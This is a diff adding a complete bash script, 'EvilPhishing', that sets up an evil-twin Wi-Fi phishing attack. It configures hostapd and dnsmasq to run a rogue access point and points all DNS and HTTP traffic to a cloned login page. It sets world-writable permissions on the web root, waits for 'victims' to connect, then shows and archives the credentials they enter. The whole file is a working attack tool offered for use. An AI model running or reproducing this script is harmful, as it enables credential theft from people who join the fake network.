@@ -1,0 +1,163 @@
+#!/bin/bash
+# EvilPhishing
+# Gabriel Haab, Jan 2018
+
+echo "Checking for dependencies ...."
+
+if command -v dnsmasq >/dev/null 2>&1 ; then
+echo "dnsmasq [OK]"
+else 
+echo "dnsmasq [ ] Please install this software to use this script"
+fi
+
+if command -v hostapd >/dev/null 2>&1 ; then
+echo "hostapd [OK]"
+else 
+echo "hostapd [ ] Please install this software to use this script"
+fi
+
+if command -v apache2 >/dev/null 2>&1 ; then
+echo "Apache2 [OK]"
+else 
+echo "Apache2 [ ] Please install this software to use this script"
+fi
+
+if command -v php >/dev/null 2>&1 ; then
+echo "php [OK]"
+else 
+echo "php [ ] Please install this software to use this script"
+fi
+
+# ===== Check Sudo =======
+
+if [ $(id -u) != "0" ]; then
+    echo "You need to be root to run this script, try:sudo ./EvilPhish"
+    exit 1
+fi
+
+# ========================
+
+
+echo " _____       _ _ ____  _     _     _     _             "
+echo "| ____|_   _(_) |  _ \| |__ (_)___| |__ (_)____   __ _ "
+echo "|  _| \ \ / / | | |_) | |_ \| / __| |_ \| |  _ \ / _  |"
+echo "| |___ \ V /| | |  __/| | | | \__ \ | | | | | | | (_| |"
+echo "|_____| \_/ |_|_|_|   |_| |_|_|___/_| |_|_|_| |_|\__, |"
+echo "                                                 |___/ "
+
+# ============================================================
+# ================== CREATING THE AP =========================
+# ============================================================
+echo "Please select the webpage"
+select clone in `ls WebPages` ; do
+
+if [ $clone ]; then
+	break
+else
+	echo "Invalid page, please use the New_Page script to create new pages"
+fi
+done
+
+if [ -d "/var/www/html" ]; then
+  
+  if [ -d "/var/www/old" ]; then	
+  rm -r /var/www/old
+  fi
+
+mkdir /var/www/old
+mv /var/www/html/* /var/www/old 
+fi
+
+cp -r WebPages/$clone/* /var/www/html/
+chmod 777 /var/www/html/*
+chmod 777 /var/www/html
+
+	systemctl stop dnsmasq
+	systemctl stop hostapd
+	
+	echo "[+] Please select the wireless interface that you want to use:" 
+	
+	select netcard in `ifconfig -a | grep flags |cut -d ':' -f 1 | grep -v lo | grep -v eth0` ; do
+		if [ $netcard ]; then
+			break
+		else
+			echo "please choose the number next to the interface"
+		fi
+	done
+	
+	# ========= dnsmasq ========== 
+	
+	cp /etc/dnsmasq.conf /etc/dnsmasq.conf.orig
+	
+	echo "interface=$netcard" > /etc/dnsmasq.conf
+	echo "dhcp-range=192.168.4.2,192.168.4.100,255.255.255.0,24h" >> /etc/dnsmasq.conf
+	echo "" >> /etc/dnsmasq.conf
+	echo "" >> /etc/dnsmasq.conf
+	echo "address=/#/192.168.4.1" >> /etc/dnsmasq.conf
+	echo "server=/google.com/#" >> /etc/dnsmasq.conf
+
+	echo "/etc/dnsmasq.conf modified"
+	
+	# ========= hostapd ==========
+	
+	echo "[+] What's the wireless name?"
+	read -r ssid
+	ch=$(( ( RANDOM % 11 )  + 1 ))
+	echo "channel = $ch"	
+
+	if [ -e "/etc/hostapd/hostapd.conf" ]; then
+	mv /etc/hostapd/hostapd.conf /etc/hostapd/hostapd.conf.orig
+	echo "hostapd.conf modified to hostapd.conf.orig"
+	fi
+	touch /etc/hostapd/hostapd.conf
+	
+	echo "interface=$netcard" > /etc/hostapd/hostapd.conf
+	echo "driver=nl80211" >> /etc/hostapd/hostapd.conf
+	echo "ssid=$ssid" >> /etc/hostapd/hostapd.conf
+	echo "hw_mode=g" >> /etc/hostapd/hostapd.conf
+	echo "channel=$ch" >> /etc/hostapd/hostapd.conf
+	
+	mv /etc/default/hostapd /etc/default/hostapd.orig
+	touch /etc/default/hostapd
+	echo 'DAEMON_CONF="/etc/hostapd/hostapd.conf"' >> /etc/default/hostapd
+	
+	nmcli radio wifi off 
+	rfkill unblock wlan
+	ip address add 192.168.4.1/24 dev $netcard 
+	
+	systemctl unmask hostapd
+	
+	service hostapd start
+	service dnsmasq start
+
+# ======= Redirecting all Traffic ======
+	
+	iptables -t nat -A PREROUTING -d 0/0 -p tcp --dport 80 -j DNAT --to-destination 192.168.4.1:80
+	
+	echo "[+] All traffic will be redirected to your page"
+
+service apache2 start
+
+iw dev $netcard set txpower fixed 30mBm
+
+echo "*******************************************************"
+echo "Attack is running, just wait for the victims to connect"
+echo "*******************************************************"
+select huehue in 'Check_Credentials' 'Stop_Attack' ; do
+
+	if [ $huehue = 'Check_Credentials' ]; then 
+		cat /var/www/html/mydatafile
+
+	elif [ $huehue = "Stop_Attack" ]; then 
+
+	if [ -e "/var/www/html/mydatafile" ]; then
+	echo "*********$clone***********" >> /var/www/html/mydatafile
+	mv /var/www/html/mydatafile `pwd`/Victims/`date | tr ' ' '_'`_mydatafile_$clone
+	echo "[+] mydatafile saved on `pwd`/Victims"
+	fi
+	
+	source Back_to_normal $netcard
+
+	break	
+	fi
+done 
